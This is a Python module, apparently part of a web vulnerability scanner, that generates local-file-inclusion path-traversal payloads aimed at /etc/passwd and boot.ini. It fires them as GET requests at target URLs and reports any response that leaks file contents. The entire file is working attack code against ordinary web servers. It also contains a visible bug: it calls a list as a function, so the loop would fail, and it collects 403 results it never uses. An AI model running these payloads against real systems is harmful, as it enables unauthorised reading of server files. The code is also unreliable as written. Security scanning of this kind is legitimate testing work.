from utils.utilities import *
from utils.levels import *
from core.AttackerBase import AttackerBase

class LFI(AttackerBase):
    def __init__(self,reporter,depth=6):
        super().__init__(reporter)
        self.depth=depth
        self.payloads={"..%2f":"%2f","../":"/","%2e%2e%2f":"%2f","%2e%2e/":"/","%2e%2e%5c":"%5c","%2e%2e\\":"\\","..%5c":"%5c"}
    def generate_lfi_payloads(self):
        lfi_payloads=[]
        for depth in range(self.depth):
            for key in self.payloads.keys():
                payload=key*depth
                payload_lin=payload+"etc"+self.payloads[key]+"passwd"
                payload_win=payload+"boot.ini"
                lfi_payloads.append(payload_lin)
                lfi_payloads.append(payload_win)
        return lfi_payloads
    def start(self,urls):
        results403=[]
        results={"url":[],"payload":[]}
        lfi_payloads=self.generate_lfi_payloads()
        for url in urls:
            url=url.split("/")[:-1]
            url="/".join(url)+"/"
      
            for payload in lfi_payloads():
                resp=self.requester.send_get(url+payload)
                if(resp.status_code==403):
                    results403.append(url+payload)
                if("root:" in resp.text or "[boot" in resp.text):
                    results["url"].append(url)
                    results["payload"].append(payload)
        self.report(results,"Local File Inclusion",ImportanceLevel.HIGH)